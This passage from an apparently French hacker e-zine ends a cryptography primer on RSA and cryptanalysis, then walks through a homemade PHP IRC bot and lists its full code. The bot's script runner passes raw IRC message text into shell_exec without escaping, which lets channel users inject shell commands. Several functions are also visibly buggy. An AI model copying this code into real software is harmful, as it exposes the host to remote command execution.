une simple substitution), puis d'appliquer la formule suivante pour chiffrer le bloc B :
C = B^e modulo n
Pour dΘchiffrer, il suffit d'appliquer :
B = C^d modulo n
Sous ce miracle se cache de l'arithmΘtique car ces nombres vΘrifient  
(B^e)^d=B^(e*d)=(B^d)^e=B modulo n, on peut donc Θgalement chiffrer avec sa clΘ privΘe.


L'avantage  de RSA est que trouver p et q est trΦs facile avec des algorithmes  probabilistes 
de primalitΘ, tant que le nombre n'est pas premier on en gΘnΦre  alΘatoirement  un  autre. Le 
calcul de n et m est trΦs rapide, e aussi avec l'algorithme  d'Euclide,  et d  grΓce   α  une 
Θquation de type bezout. Enfin le calcul de x^y modulo k  se  fait  grΓce  α  l'exponentielle 
rapide. Cette mΘthode est donc trΦs rapide α mettre en  place,  par contre α l'heure actuelle 
il est pratiquement impossible de factoriser n (donc  retrouver  p  et q, nΘcessaires pour le 
calcul de d). La sociΘtΘ RSA offre de l'argent aux  personnes  rΘussissant  α  factoriser des 
grands nombres, le dernier en date est un nombre  de  200  chiffres : "The  sieving effort is 
estimated to have taken the equivalent of 55  years  on  a  single  2.2  GHz Opteron CPU. The 
matrix  step  reportedly  took  about  3  months  on  a  cluster  of  80  2.2  GHz Opterons." 
[http://www.rsasecurity.com/rsalabs/node.asp?id=2094]


LA CRYPTANALYSE

La  cryptanalyse  doit,  si elle rΘussi, permettre de trouver soit le texte original, soit la 
clΘ d'un message chiffrΘ. On suppose donc pour cela que l'espion connaεt le fonctionnement de 
l'algorithme.

L'histoire  de  la cryptanalyse est assez longue, avec pas mal de rΘussites, surtout  pendant 
les  guerres  comme la seconde guerre mondiale, avec la machine allemande Enigma  qui  a  ΘtΘ 
cassΘe, et qui a jouΘ un r⌠le dans l'issue de cette guerre.

Il existe plusieurs mΘthodes, selon ce qu'il possΦde :
- l'attaque α texte chiffrΘ seulement : l'espion  possΦde  plusieurs textes chiffrΘs avec  la 
  mΩme clΘ, et doit retrouver le texte clair ou la clΘ.
- l'attaque α texte clair connu : l'espion possΦde les textes chiffrΘs et  leur  texte  clair 
  correspondant, il doit retrouver la  clΘ  ou  un  algorithme  pour  dΘchiffrer  les  autres 
  messages chiffrΘs avec la mΩme clΘ.
- l'attaque α texte clair choisi : l'espion peut obtenir le texte chiffrΘ α partir des textes 
  clairs  qu'il  veut, son but est le mΩme qu'avec le texte clair connu, mais est  bien  plus 
  efficace.
- l'attaque  α  texte  chiffrΘ choisi : l'espion peut choisir de dΘchiffrer les textes  qu'il 
  veut, et doit retrouver la clΘ (une sorte de reverse engineering ;)

Les  deux  premiΦres  sont  les  plus courantes, car il est assez facile de deviner certaines 
parties de messages (en-tΩtes... #define, int pour du code C), ou lorsque  qu'Alice  transmet 
tout ce que lui donne l'espion pour l'envoyer α Bob.

La cryptanalyse est une Θtape obligatoire dans la vie d'un algorithme de chiffrement :  aprΦs 
avoir soumis au monde entier son algorithme, si celui ci n'a pas rΘussi α  Ωtre  cryptanalysΘ 
on peut supposΘ que c'est un bon algorithme : ΘnormΘment d'Θtudes  ont  par  exemple  Θtaient 
faites sur le DES, il faut 2^47 textes clairs choisis pour cryptanalyser  un  DES  classique, 
mais seulement 2^20 en remplaτant les  tables  utilisΘes  dans  les  rondes  par  des  tables 
alΘatoires...

Certains algorithmes se cassent en deux secondes (substitution ou transposition),  alors  que 
d'autres nΘcessitent de tester toutes les clΘs possibles, mais une taille suffisante  de  ces 
derniΦres exclue cette possibilitΘ, mΩme avec des ordinateurs les plus puissants imaginables.

La cryptanalyse est une science trΦs complexe, comprenant beaucoup de mΘthodes (cryptanalyses 
linΘaires, diffΘrentielles, ...) et nΘcessite des bases mathΘmatiques  trΦs  solides  dΦs que 
les algorithmes sont compliquΘs.

CONCLUSION

Cet  article  offre  un  petit  tour  d'horizon  du  monde de la cryptographie. Il y a encore 
ΘnormΘment  de  choses  α  dire,  sur les protocoles, les algorithmes, la stΘganographie, les 
fonctions de hachage α sens unique, les gΘnΘrateurs de nombres alΘatoires,  la  sΘcuritΘ  des 
algorithmes et la cryptanalyse rΘelleà Un autre type de cryptographie est en train de voir le 
jour : la cryptographie quantique,  qui  ne  se  base plus sur des difficultΘs mathΘmatiques, 
mais sur une impossibilitΘ  physique (cloner des photons). Un protocole de transmission a ΘtΘ 
proposΘ et fonctionne,  mais  cette technique fait pour le moment face α quelques difficultΘs 
comme les grandes  distances  et  la  rapiditΘ.  Des  Θtudes sont en cours pour pallier α ces 
problΦmes, mais le  co√t  de  cette  technique la rΘserve pour le moment aux gouvernements et 
grosses entreprises.

Avant de finir je voudrai vous citer le dΘbut de la prΘface de "Cryptographie appliquΘe"  (de 
Bruce Schneier), que je recommande fortement α tout ceux que cet  article  a  intΘressΘ : "Il 
existe deux types de cryptographie dans le monde : la cryptographie qui empΩche votre  petite 
soeur de lire vos fichiers, et la cryptographie qui empΩche les principaux  gouvernements  de 
lire vos fichiers".

Il est Θvident que pour un petit usage, du DES ou un autre petit algorithme suffira. Pour les 
gouvernements, il ne faut pas oublier qu'ils ont de l'argent et les moyens de casser  pas mal 
de codes. Avant de valider le DES, la NSA (National  Security  Agency  pour  les  incultes) a 
modifiΘ certaines tables dΘfinies dans l'algorithme. Personne ne sait  pourquoi,  les  tables 
initiales (par IBM) proposaient le mΩme niveau de sΘcuritΘ... Je   vous  laisse  allez  α  la 
parano∩a (certains disent que c'est juste par mΘfiance d'IBM), et j'ajouterai mΩme que la NSA 
embauche les meilleurs mathΘmaticiens et cryptologues du monde... Il ne  faut  pas  non  plus 
oublier que la cryptographie doit faire parti d'une politique complΦte  de  sΘcuritΘ : α quoi 
sert le chiffrement de messages si l'espion peut voir votre Θcran  (TEMPEST par exemple ou de 
simples camΘras) ou voir ce que vous tapez au clavier...  N'oubliez  pas que dans le monde de 
la cryptographie, la parano∩a est nΘcessaire pour survivre...

Steck



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |                                                              \\_  \_ \   \\_ 1  + 
 || |                http://hackever.n0ne.org                      \_ \   \\_  \_ \ 1   
 ||'|                                                                \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Membre honnoraire du webring Hack.fr                                  ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[18]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ un affaire de bot php         ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: Et wyzeman reinventa la roue...again                      ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[   Wyzeman    ]=\:\ _//     
                                                  \__\________________________/__/ 



	Pour ceux qui sont tanner de scripter en TCL (the crappy language), dont surtout  moi 
mΩme, j'ai starter un dimanche matin o∙ coder un truc useless etais  une  alternative  tout α 
fait agrΘable plutot que dΘcouter le jour du seigneur α  radiocan,  un  bot en php scriptable 
(hum hum) en php. Un bot programmer avec la philosophie que le  bot  en  tant  que  telle  ne 
devais etre qu'un frame interface entre irc  et  les  scripts  et  que donc par default il ne 
saurait rien faire d'autre que  de  se  connecter sur irc et dexecuter des scripts. Il existe 
sans  doute  beaucoup  de  facon  leet  de  faire  executer  des  scripts  a  un  bot,   mais 
personnellement Θtant  un  adepte  du "mouais mais ca marche..." j'ai fait tout autrement  et 
j'ai  utilisΘ  la  mΘthode  la  plus  lame et la plus simple possible, a chaque Θvent je fait 
executer lensemble des scripts scanner dans le repertoire de script  par  l'interpreteur  php 
avec une convention au niveau des arguments, et store le  buffer  dans  une  variable qui est 
ensuite analyser par un filtre simple qui recherche  quelque  commande  hardcoder dans le bot 
(cette  parti  pourrais  meme  devenir  scriptables  (word,  des  scripts  analyser  par  des 
scripts!!!)).



	
	Je  dΘcrirais  donc  les  diffΘrents  modules  et boutes de code significatif afin de 
permetre de suivre le raisonement du projet du dΘbut α la "fin". Le bot  Θtant  trΦs  rΘduits 
dans le nombre de ces fonctions officiel fonctionne avec trΦs peu de modules (et utopiquement 
beaucoup de script). Les modules suivants suffise α la  tache :  socket,  irc,  script,  file 
system. Un fichier de configuration est  nescessaire au bot, les scripts tant qua eu pourrons
referer a leur propre fichier de  configuration,  de  plus qu'ils leur sera possible de faire 
appelle a des librairies de fonction ou a des classes d'object si dΘsirΘ. 


	Modules:
	1) core
	2) socket		
	3) irc
	4) script
	5) file system
		


0) la conf

	bien qu'il y ai peu de chose a dire sur la conf (une conf est une conf  apres  tout), 
mais juste la paster ici risque daider a suivre le reste du code et a meviter  dla  paster 5x 
dans l'article.


<?PHP

$conf['host'] = "us.undernet.org";
$conf['port'] = 6667;	
$conf['ident'] = "shrug";
$conf['realname'] = "just do it";
$conf['nick'] = "Wyzebot";

$conf['chanlist'][0] = "#code.fr";
$conf['chanlist'][1] = "#hack.fr";
$conf['chanlist'][2] = "#linux.fr";


?>

	bon  on comprend vite le principe, non c pas multi network pour l'instant, mais c'est 
dans la todo liste de la v2.0.



1) core

	Le core du bot est relativement simple (tout α l'image de sont ensemble dailleur). il 
ne fait que loader les diffΘrents modules et du transfere du buffer de la connection  irc  au 
analyseur qui eux s'occuperont de lancer les scripts de facon conforme. Les seules lignes qui 
ne soit pas des appelles de constructeur dobjet ou des includes  de  fichier  important, sont 
dans un premier temps le bout de code qui lit le repertoire des scripts  afin d'en  faire une 
liste garder dans un array, imΘdiatement suivie de l'inΘvitable loop  de lecture et d'analyse 
du socket connecter a irc. 



<?PHP
/*
Wyzebot 1.0 
Projet de: Wyzeman@mindkind.org
but: faire un frame de bot iso IRC scriptable en php.
     le bot devras etre le plus minimaliste possible.
     toute fonction sera dans la mesure du possible
     gerrer par les scripts. 
     
codeur : wyzeman,
*/
set_time_limit(0);

//loading des modules du bot
include("core/socket.php");
include("core/irc.php");
include("core/script.php");
include("core/wash.php");
include("conf/general.conf.php");

//var $scriptlist = array();
//initialisation des objets
echo $conf['host']."\r\n";
echo $conf['port']."\r\n";
$sock = new sock($conf['host'], $conf['port']);
$link=$sock->con($conf['host'],$conf['port']);
$irc = new irc($conf['ident'], $conf['realname'], $conf['nick'], $conf['chanlist']);
$script = new script($conf, $sock, $link);
//listing des scripts present dans /script et 
//garder sous un format array
$wash = new wash();
$scriptlist = $wash->lsfile("scripts/");
for ($x=0;$x&lt;count($scriptlist);$x++)
	{
	echo $scriptlist[$x]."\r\n";
	}
//loop "infini", mise en fonction du bot.
while(1)
	{
	sleep(5);
	//lecture du/des socket(s)
	$buffer = $sock->buffering($link);
	//parsing du RFC IRC et initialisation des scripts
	$irc->analyse($conf['chanlist'], $buffer, $scriptlist, $script, $link, $sock);
 	}
?>


	l'analyse des resultat du socket ou du status irc pourras creer un arret du loop,
comme on pourras voir plus loin dans lanalyse des modules.


2) les sockets 


	Il n'y a rien de tres compliquer a faire des sockets en php de mΩme que puisque  nous 
utilisons des classes, nous auront tout le loisir de  les  amΘliorer  dans  le  future.  Nous 
pouvons donc nous permetre (une fois de plus) d'Ωtre lazy  et  de crΘer une class socket  php 
qui est en fait un interface d'utilisation de  fopen()  ce  qui fera amplement l"affaire pour 
des connections irc ou proxy.  Comme  validation  nous  nous  contenterons  pour  linstant de 
vΘrifiΘ si le port est numerique et que le ip ne l'est  pas.  Les  autres  fonctions concerne 
l'initialisation  du  socket en question, sa lecture, sont ecriture et sa fermeture. Voila il 
n'en faut pas plus pour avoir une class socket utilisable en php pour un nombre illimiter  de 
projet utilisant de simple socket TCP. 

<?php

class sock
	{
	//pseudo constructeur	
	function sock($host, $port)
		{
		if ($this->validate($host, $port))
			{	
			return(TRUE);
			}
		else
			{
			die ("config error");
			}
		}
	//verification (pour linstant tres basic des caracteres dentrer
	function validate($host, $port)
  		{
	  	if (is_numeric($port) && !is_numeric($host))
  			{
  			return(TRUE);
  			}
	  	else
  			{
  			return(FALSE);
  			}
  		}
	//connecter un socket		
	function con($host,$port)
		{
		$sock = fsockopen($host, $port);
		if (fsockopen)
			{
			return($sock);
			}
		else 
			{
			return(FALSE);
			}					
		}	
	//disconnecter un socket		
	function discon($sock)
		{
			
			if(fclose($sock))
				{
				return(TRUE);
				}
			else
				{
				return(FALSE);	
				}
		}	
	//lire le socket	
	function buffering($sock)
		{
		$buffer = fread($sock,32000);
		return($buffer);
		}
	//ecrire sur le socket
	function sending($sock, $word)
		{
		if(fwrite($sock, $word) === FALSE)
			{
			return(TRUE);
			}
		else
			{
			return(FALSE);
			}
		} 
		
	}
	

?> 


	ce a quoi nous pouvons quand meme faire quelque amΘliration, notament au niveau de la 
validation  du  ip et du port. de plus, un support de proxy pourrais  etre  rajouter  afin de 
permetre a notre bot de les utilisers pour se connecter plus  discretement sur irc, ou encore 
a nos scripts pour differentes tache (en utilisant  une  version  modifier  de  cette  classe 
socket ou directement celle ci, a moin que vous ayez votre propre classe socket). 

	Plus concretement cest modifications pourrais etre les suivantes pour  la validation, 
soit verifier si le port est entre 1 et 65535 (j'ai connu tres peu de serveur irc et/ou proxy 
avec un port negatif). De plus nous pourrions verifier  si  les  quatres composant du ip sont 
numΘrique. Avec ca, on est a peu  pret  sur davoir affaire a un ip. On devrais aussi verifier 
si chaque portion du ip est situer entre 1 et 255. 



	function validate($host, $port)
  		{
		$ip=explode(".",$host);
	  	if ( $port >= 1 && $port <= 65535 && is_numeric($port) && 
                     !is_numeric($host) && count($ip) == 4 && 
                     is_numeric($ip[0]) && is_numeric($ip[1]) && 
                     is_numeric($ip[2]) && is_numeric($ip[3] && $ip[0] >=1 && ip[0] <=255 &&
$ip[1] >=1 && ip[1] <=255 &&
$ip[2] >=1 && ip[2] <=255 &&
$ip[3] >=1 && ip[3] <=255 &&))
  			{
  			return(TRUE);
  			}
	  	else
  			{
  			return(FALSE);
  			}




	Θvidament  vu  comme  ca ca peu etre platte α dΘbuger dans 2 ans. Alors rendons ca un 
peu plus user friendly.


	function validate($host, $port)
		{
		$flag=FALSE;
		//transmutation du host en array
		$ip=explode(".",$host);
		//validation du port
		if (is_numeric($port))
			{
			if ($port >= 1 && $port <= 65535)
				{
				$flag=TRUE;		
				}
			else
				{
				$flag=FALSE;
				}
			}
		else
			{
			$flag=FALSE;
			}		

		//validation du host
		//ok jsais le premier est pas mal bidon ;]
		if (!is_numeric($host))
			{
			if (count($ip) == 4)
				{
				if (is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))
					{
					if($ip[0] >= 1 && $ip[0] <= 255 && $ip[1] >= 1 && $ip[1] <= 255 && $ip[2] >= 1 && $ip[2] <= 255 && $ip[3] >= 1 && $ip[3] <= 255 )
						{
						$flag=TRUE;
						}
					else 
						{
						$flag=FALSE;
						}
					}
				else
					{
					$flag=FALSE;
					}
				}
			else
				{
				$flag=FALSE;
				}
			}
		else 
			{
			$flag=FALSE;
			}

		return($flag);

		}


	Θvidament ca prend bcoup plus de place :|.


3) irc


	il sagit ici de parser le protocole irc qui nous est pitcher par le socket ouvert sur 
le serveur. Pour les besoins de la demonstration seul les fonctions de  base  on  ete parser, 
comme vous verrez larbre des possibles permet facilement dajouter  de  nouvelle  fonction  au 
parser sans entrez en conflit avec des scripts deja existant. le  parser  ne fait que catcher 
le protocole irc. Evidament une bonne connaissance du rfc irc (1459) est prΘfΘrable pour bien 
comprendre cette partis. Pour ceux qui sont  trop  lazy  pour  taper rfc 1459 dans google, je 
vais ici expliquer le minimum pour etablir une connection avec un serveur irc.

telnet je vous pris.


telnet us.undernet.org 6667
Trying 207.172.156.252...
Connected to us.undernet.org.
Escape character is '^]'.
NOTICE AUTH :*** Looking up your hostname
NOTICE AUTH :*** Checking Ident
NOTICE AUTH :*** Found your hostname


ici le serveur attend quon sauthentifie

user usernameici x x :realnameici
nick usernickici

ensuite  le  serveur  nous  envois un ping au quel nous devons repondre pour officialiser  la 
connection.

PING :109186035
PONG :109186035

ensuite vous poorrez vous debrouiller dans relativement toute les situations vivable sur  irc 
α l'aide de 4 commande de base

JOIN
PART
PRIVMSG
MODE


exemple
join #hack.fr
privmsg #hack.fr :ta soeur suce des choux
part #hack.fr :sa suxx

et pour mode ca peu ressembler a ceci si vous avez les droits necessaire

mode #hack.fr +o wyzeman


bon,  je  crois  que  c'est  assez  pour  le rfc irc avant que les lecteurs qui se soit rendu 
jusqu'ici ne partent en courant. La technique que jai utiliser pour parser  le  protocole irc 
est  tres  simple,  en  gros  je separe chaques parti du buffer recu en ligne (\n) et en mots 
(" ") (un espace signifie que un mots fini et que un autre commence (ca lair facile dit comme 
ca... pi ca l'est aussi..). Ensuite  je  fais  analyser chaque premier mots de phrase afin de 
voir si il sagit d'un call  irc,  certaine  commande  irc demande une plus grande analyse. Ce 
besoin se retrouve surtout dans les commandes qui ne sont pas numerotΘ, la phrase  doit  donc 
etre Θtudier un peu plus dans sont ensemble pour la differencier  d'une  fausse  commande. La 
position de chaque mots dans la phrase Θvitera de se faire  arnaquer  par  une phrase crafter 
sur un chat de par exemple quelquun qui explique le  protocole irc (le premier mots de chaque 
phrase dite sur un chan netant pas le premier mots que votre client recois (privmsg chan/nick 
:blablablaba) le  premier  mots  d'une phrases dite sur irc se retrouvera donc a etre le 3eme 
mots  envoyer  via  le  protocole  irc  au  client.  Ainsi  donc,   aucun   risque   d'erreur 
d'interprΘtation. Un coup identifier chaque commande irc sera envoyer aux  diffΘrents scripts 
qui  soccuperont de faire le  necessaire  pour  les  traiters  Exeption  faite  des  commande 
necessaire a la connection qui elle sont hard coder  dans  le  script.  Chaque  script  etant 
executer et sont output sender sur le socket  permetant  ainsi d'interagir. Pour ce faire les 
scripts nont qua faire un echo  ou  un  print des commandes a renvoyers au serveur qui seront 
catcher par lanalyser de script et envoyer sur le socket. Les commandes envoyer au socket par 
les scripts doivent respecter le protocole irc sinon elle ne feront pas grand chose ;].




<?PHP

class	irc
	{
	// initalisation des variables global
	var $trueserv;	
	var $nick;
	var $ident;
	//pseudo constructeur
	function irc($ident, $realname, $nick)
		{
		$this->ident = $this->make_ident($ident, $realname);
		$this->nick = $this->make_nick($nick);		
		$this->trueserv = "dummy";
		}
	//parsing du RFC IRC
	function analyse($chanlist, $buffer, $scriptlist, $script, $link, $sock)
		{
		echo $buffer;
		//division du buffer en string
		$string = explode ("\n",$buffer);
		for ($x=0;$x&lt;count($string);$x++)
			{
			//division de chaque mots de la string
			$word = explode(" ",$string[$x]);	  
			switch (strtolower($word[0]))
				{
				//someone or someting notice us
				case "notice":
				switch (strtolower($word[1]))
					{
					// look like an Ident query
					case "auth":
						switch (strtolower($word[2]))
							{
							// that really means nothing to me but...
							case ":***":
								switch (strtolower($word[3]))
									{
									//this really look like an ident querry.. lets see
									case "checking":
									   // strtolower retourne bien "ident" mais il est pas catcher par le case.
									   // ya p-e une limite au nombre de case imbriquer. 
									   //echo strtolower($word[4]);
									   //switch (strtolower($word[4]))
									  //	 {
									  	 //this really most be an Ident query, so why not answering it ?	
									 // 	 case "ident":
													 echo $this->ident;
													 echo $this->nick;
													 $sock->sending($link, $this->ident);
													 $sock->sending($link, $this->nick);
													 $script->spread("ident", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
										//		 break;
										//	 }
									   break;
									}					
								break;
							}
						break;
					}
					break;
				//PING? PONG! aka still alive check
				case "ping":
					$pong = $this->make_pong($word[1]);
					echo $pong;
					$sock->sending($link, $pong);
					$script->spread("ping", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
					break;
				//gestion des erreurs IRCD	
				case "ERROR":
					switch (strtolower($word[1]))
						{
						//lien au serveur terminer	
						case 	":closing link:":
							$script->spread("closed link", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
							break;
						}
					break;
				// motd
				case "001":
				  //echo "MOTD*******************************";
					$this->trueserver = ltrim($word[0],":");
					$script->spread("motd", $this->trueserv, $string[$x], $scriptlist, $link, $sock);				  
					break;
				// end of motd
				case "376":
				  //echo "EOMOTD******************************";
					$this->expand($sock, $link, $chanlist);
					$script->spread("eomotd", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
					break;
				case "PRIVMSG":
					$script->spread("prvmsg", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
					break;
				default:

					break;
				}
			}			
		}
//tweaking de l'ident	
	function make_ident($ident, $realname)
		{
		$ident = "USER ".$ident." X X :".$realname."\r\n";
		return($ident);	
		}
//tweaking du nick	
	function make_nick($nick)
		{
		$nick = "NICK ".$nick."\r\n";
		return($nick);	
		}
//tweaking du pong		
	function make_pong($ping)
		{
		$pong = "PONG ".ltrim(strtolower($ping), ":")."\r\n";
		return($pong);	
		}
//mass join		
	function expand($sock, $link, $chanlist)
		{
		for ($x=0;$x&lt;count($chanlist);$x++)
			{
			$query = "JOIN $chanlist[$x]\r\n";
			echo $query;
			$sock->sending($link, $query);	
			}
		}			
	}
?>




4) script


	Il s'agit peu etre dune contradiction mais la parti la plus importante du  bot, celle 
qui genre les scripts, est Θtrangement une des plus petite et simple. Sa seul  fonction Θtant 
d'Θxecuter l'ensemble des scripts α chaque event et d'envoyer  les  rΘsultat de chaque script 
sur le socket. 


<?PHP

class script
	{
	//initialisation des variables
	var $ident;
 	var $nick;
  	var $chanlist;
	
	//pseudo constructeur
	function script($conf, $sock, $link)
		{	
		$this->host = "dummy";
		$this->chanlist = array();
		$this->ident = $conf['ident'];
		$this->nick	= $conf['nick'];		
		}	
	
	//execution des scripts et analyse des resultats
	function spread($event, $host, $string, $scriptlist, $link, $sock)
		{
		$host = $this->host;
		$ident = $this->ident;	
		$nick = $this->nick;				
		for ($x=0;$x&lt;count($scriptlist);$x++)
			{
			$output = shell_exec("/usr/bin/php -q scripts/".$scriptlist[$x]." ".$host." ".$ident." ".$nick." ".$event." ".$string);
			echo $output;
			$sock->sending($link,$output);
			}
		}			
	}


?>



5) file systΦme


	Le seul besoin actuel davoir une class file system dans ce bot est de  lire lensemble 
des scripts a Θxecuter. Les dits script pourrons reutiliser cette classe  pour leur besoin ou 
en inventer une autre plus adapter. 


<?PHP
class wash
	{
	function wash()
		{
		}
  
  function lsfile($dir)
		{
		$x=0;
		$ls=opendir($dir);
		while(false !== ($lsdir = readdir($ls)))		
			{
		    if(!is_dir($dir."/".$lsdir))
				{
				//echo $lsdir."\r\n";
				$flist[$x]=$lsdir;
				$x++;
				}
			}
		return($flist);
		}		
	}
?>



voila, donc comme vous lavez vus a travers cette article, faire un bot "complet"  en  php est 
une  chose  facile  qui  peu  mener α un systΦme Θfficace et puissant. Pour ceux qui voudrais 
tester  le  bot  sans  se  taper  l'article, j'inclus ici α la fin l'ensemble des classes qui 
compose le bot. si quelqu'un α envie de continuer le devellopement de se bot, envoyer moi  un 
message a wyzeman@mindkind.org.




wyzebot,php begin

#!/usr/bin/php
<?PHP
/*
Wyzebot 1.0 
Projet de: Wyzeman@mindkind.org
but: faire un frame de bot iso IRC scriptable en php.
     le bot devras etre le plus minimaliste possible.
     toute fonction sera dans la mesure du possible
     gerrer par les scripts. 
     
codeur : wyzeman,
*/
set_time_limit(0);

//loading des modules du bot
include("core/socket.php");
include("core/irc.php");
include("core/script.php");
include("core/wash.php");
include("conf/general.conf.php");

//var $scriptlist = array();
//initialisation des objets
echo $conf['host']."\r\n";
echo $conf['port']."\r\n";
$sock = new sock($conf['host'], $conf['port']);
$link=$sock->con($conf['host'],$conf['port']);
$irc = new irc($conf['ident'], $conf['realname'], $conf['nick'], $conf['chanlist']);
$script = new script($conf, $sock, $link);
$wash = new wash();
$scriptlist = $wash->lsfile("scripts/");
for ($x=0;$x&lt;count($scriptlist);$x++)
	{
	echo $scriptlist[$x]."\r\n";
	}
//loop "infini", mise en fonction du bot.
while(1)
	{
	sleep(5);
	//lecture du/des socket(s)
	$buffer = $sock->buffering($link);
	//parsing du RFC IRC et initialisation des scripts
	$irc->analyse($conf['chanlist'], $buffer, $scriptlist, $script, $link, $sock);
 	}
?>


wyzebot.php stop



conf/general.conf.php begin

<?PHP

$conf['host'] = "us.undernet.org";
$conf['port'] = 6667;	
$conf['ident'] = "shrug";
$conf['realname'] = "just do it";
$conf['nick'] = "Wyzebot";

$conf['chanlist'][0] = "#code.fr";
$conf['chanlist'][1] = "#hack.fr";
$conf['chanlist'][2] = "#linux.fr";


?>

conf/general.conf.php stop



core/irc.php start

<?PHP

class	irc
	{
	// initalisation des variables global
	var $trueserv;	
	var $nick;
	var $ident;
	//pseudo constructeur
	function irc($ident, $realname, $nick)
		{
		$this->ident = $this->make_ident($ident, $realname);
		$this->nick = $this->make_nick($nick);		
		$this->trueserv = "dummy";
		}
	//parsing du RFC IRC
	function analyse($chanlist, $buffer, $scriptlist, $script, $link, $sock)
		{
		echo $buffer;
		//division du buffer en string
		$string = explode ("\n",$buffer);
		for ($x=0;$x&lt;count($string);$x++)
			{
			//division de chaque mots de la string
			$word = explode(" ",$string[$x]);	  
			switch (strtolower($word[0]))
				{
				//someone or someting notice us
				case "notice":
				switch (strtolower($word[1]))
					{
					// look like an Ident query
					case "auth":
						switch (strtolower($word[2]))
							{
							// that really means nothing to me but...
							case ":***":
								switch (strtolower($word[3]))
									{
									//this really look like an ident querry.. lets see
									case "checking":
									   // strtolower retourne bien "ident" mais il est pas catcher par le case.
									   // ya p-e une limite au nombre de case imbriquer. 
									   //echo strtolower($word[4]);
									   //switch (strtolower($word[4]))
									  //	 {
									  	 //this really most be an Ident query, so why not answering it ?	
									 // 	 case "ident":
													 echo $this->ident;
													 echo $this->nick;
													 $sock->sending($link, $this->ident);
													 $sock->sending($link, $this->nick);
													 $script->spread("ident", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
										//		 break;
										//	 }
									   break;
									}					
								break;
							}
						break;
					}
					break;
				//PING? PONG! aka still alive check
				case "ping":
					$pong = $this->make_pong($word[1]);
					echo $pong;
					$sock->sending($link, $pong);
					$script->spread("ping", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
					break;
				//gestion des erreurs IRCD	
				case "ERROR":
					switch (strtolower($word[1]))
						{
						//lien au serveur terminer	
						case 	":closing link:":
							$script->spread("closed link", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
							break;
						}
					break;
				// motd
				case "001":
				  //echo "MOTD*******************************";
					$this->trueserver = ltrim($word[0],":");
					$script->spread("motd", $this->trueserv, $string[$x], $scriptlist, $link, $sock);				  
					break;
				// end of motd
				case "376":
				  //echo "EOMOTD******************************";
					$this->expand($sock, $link, $chanlist);
					$script->spread("eomotd", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
					break;
				case "PRIVMSG":
					$script->spread("prvmsg", $this->trueserv, $string[$x], $scriptlist, $link, $sock);
					break;
				default:

					break;
				}
			}			
		}
//tweaking de l'ident	
	function make_ident($ident, $realname)
		{
		$ident = "USER ".$ident." X X :".$realname."\r\n";
		return($ident);	
		}
//tweaking du nick	
	function make_nick($nick)
		{
		$nick = "NICK ".$nick."\r\n";
		return($nick);	
		}
//tweaking du pong		
	function make_pong($ping)
		{
		$pong = "PONG ".ltrim(strtolower($ping), ":")."\r\n";
		return($pong);	
		}
//mass join		
	function expand($sock, $link, $chanlist)
		{
		for ($x=0;$x&lt;count($chanlist);$x++)
			{
			$query = "JOIN $chanlist[$x]\r\n";
			echo $query;
			$sock->sending($link, $query);	
			}
		}			
	}
?>


core/irc.php stop

core/script.php start


<?PHP

class script
	{
	//initialisation des variables
	var $ident;
 	var $nick;
  	var $chanlist;
	
	//pseudo constructeur
	function script($conf, $sock, $link)
		{	
		$this->host = "dummy";
		$this->chanlist = array();
		$this->ident = $conf['ident'];
		$this->nick	= $conf['nick'];		
		}	
	
	//execution des scripts et analyse des resultats
	function spread($event, $host, $string, $scriptlist, $link, $sock)
		{
		$host = $this->host;
		$ident = $this->ident;	
